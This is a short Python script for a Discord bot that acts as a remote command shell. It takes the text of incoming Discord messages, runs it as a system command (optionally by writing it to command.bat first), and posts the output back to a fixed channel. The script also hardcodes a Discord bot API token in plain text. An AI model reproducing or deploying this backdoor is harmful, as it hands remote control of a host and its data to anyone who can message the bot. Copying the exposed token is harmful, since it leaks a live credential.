import discord
import subprocess as sp

API_TOKEN = 'MTA3NDA5MDk1MDE3Mjg2ODgzMQ.GUlFOu.kiOEwHzmGL_MkmZiuBX8-fbu3mv8fv9V2tlIUE'
client = discord.Client(intents=discord.Intents.all())
guild = discord.Guild

@client.event
async def on_message(message):
    if message.author.bot: return

    print(message.content)

    if message.content[0] == "#":
        print(message.content.partition('#')[2])
        open("command.bat", "w+").write(message.content.partition('#')[2])

        channel = client.get_channel(1074088119575519322)

        output = sp.getoutput("command.bat")

        try:
            await channel.send(output)
        except Exception as e:
            print(e)
            open("message.txt", "w+").write(output)
            await channel.send(file=discord.File("message.txt"))

        return

    channel = client.get_channel(1074088119575519322)

    output = sp.getoutput(message.content)

    try:
        await channel.send(output.replace('Ä', '-').replace('À', '-').replace('Ã', '-').replace('³', '-'))
    except Exception as e:
        print(e)
        open("message.txt", "w+").write(output)
        await channel.send(file=discord.File("message.txt"))

client.run(API_TOKEN)
